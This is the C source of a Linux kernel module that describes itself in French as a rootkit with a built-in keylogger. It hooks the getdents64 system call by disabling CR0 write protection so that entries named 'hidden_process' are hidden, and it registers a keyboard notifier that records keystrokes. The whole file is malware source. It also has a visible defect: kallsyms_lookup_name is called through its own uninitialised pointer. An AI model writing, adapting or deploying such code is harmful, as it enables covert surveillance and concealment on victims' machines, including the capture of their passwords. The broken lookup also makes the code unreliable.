#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/version.h>
#include <linux/kbd_kern.h>
#include <linux/keyboard.h>
#include <linux/input.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("RUCKTOOA THOMAS ET Ariel Perez");
MODULE_DESCRIPTION("Rootkit qui cache les processus et keylogger intégré");

// Déclaration de kallsyms_lookup_name
static unsigned long (*kallsyms_lookup_name)(const char *name);

unsigned long *syscall_table;

// Pointeurs pour stocker les adresses des fonctions d'origine
asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent64 __user *, unsigned int);
asmlinkage int (*original_sys_open)(const char __user *, int, umode_t);

// Buffer pour stocker les frappes de clavier
static char keystroke_buffer[1024];
static int buffer_index = 0;

// Fonction hookée pour getdents
asmlinkage int hooked_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
    int nread;
    struct linux_dirent64 *d, *kdirent, *prev = NULL;
    unsigned long offset = 0;

    nread = original_getdents(fd, dirp, count);
    if (nread <= 0)
        return nread;

    kdirent = kzalloc(nread, GFP_KERNEL);
    if (kdirent == NULL)
        return nread;

    if (copy_from_user(kdirent, dirp, nread)) {
        kfree(kdirent);
        return nread;
    }

    while (offset < nread) {
        d = (struct linux_dirent64 *)((char *)kdirent + offset);
        if (strstr(d->d_name, "hidden_process")) {
            if (prev)
                prev->d_reclen += d->d_reclen;
            else
                memmove(d, (char *)d + d->d_reclen, (nread - offset - d->d_reclen));
            nread -= d->d_reclen;
        } else {
            prev = d;
        }
        offset += d->d_reclen;
    }

    if (copy_to_user(dirp, kdirent, nread)) {
        kfree(kdirent);
        return nread;
    }

    kfree(kdirent);
    return nread;
}

// Fonction pour enregistrer les frappes de clavier
static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    
    if (code == KBD_KEYSYM && param->down) {
        keystroke_buffer[buffer_index++] = param->value;
        if (buffer_index >= sizeof(keystroke_buffer))
            buffer_index = 0; // Reset buffer if full
    }

    return NOTIFY_OK;
}

// Structure pour enregistrer le keylogger
static struct notifier_block keylogger_notifier = {
    .notifier_call = keylogger_notify
};

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit loaded\n");

    // Localisation de kallsyms_lookup_name
    kallsyms_lookup_name = (void *)kallsyms_lookup_name("kallsyms_lookup_name");

    // Localisation de la table des appels système
    syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    // Localisation des adresses des fonctions d'origine
    write_cr0(read_cr0() & (~0x10000));
    original_getdents = (void*)syscall_table[__NR_getdents64];
    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents;
    write_cr0(read_cr0() | 0x10000);

    // Enregistrer le notifier pour le keylogger
    register_keyboard_notifier(&keylogger_notifier);

    return 0;
}

static void __exit rootkit_exit(void) {
    // Restauration des adresses des fonctions d'origine
    write_cr0(read_cr0() & (~0x10000));
    syscall_table[__NR_getdents64] = (unsigned long)original_getdents;
    write_cr0(read_cr0() | 0x10000);

    // Désenregistrer le notifier pour le keylogger
    unregister_keyboard_notifier(&keylogger_notifier);

    printk(KERN_INFO "Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
